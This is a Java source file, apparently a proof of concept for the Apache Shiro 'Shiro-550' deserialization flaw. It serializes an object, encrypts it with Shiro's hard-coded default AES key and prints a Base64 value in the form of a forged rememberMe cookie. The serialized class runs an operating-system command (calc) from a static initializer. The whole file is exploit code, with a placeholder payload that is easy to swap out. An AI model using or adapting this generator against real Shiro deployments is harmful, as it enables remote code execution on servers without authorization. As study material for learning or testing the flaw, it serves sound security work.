package com.example.shirospring.manual;

import org.apache.shiro.crypto.AesCipherService;
import java.io.*;
import org.apache.shiro.codec.Base64;

public class Shiro550{
    public static void main(String[] args) throws Exception {
        Test test = new Test();

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(test);


        String key = "kPH+bIxk5D2deZiIxcaaaA==";
        byte[] byteKey = Base64.decode(key);

        AesCipherService aesCipherService = new AesCipherService();
        byte[] ans = aesCipherService.encrypt(baos.toByteArray(), byteKey).getBytes();

        System.out.println(new String(Base64.encode(ans)));
        oos.close();

    }
}



class Test implements Serializable{
    static {
        try {
            Runtime.getRuntime().exec("calc");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
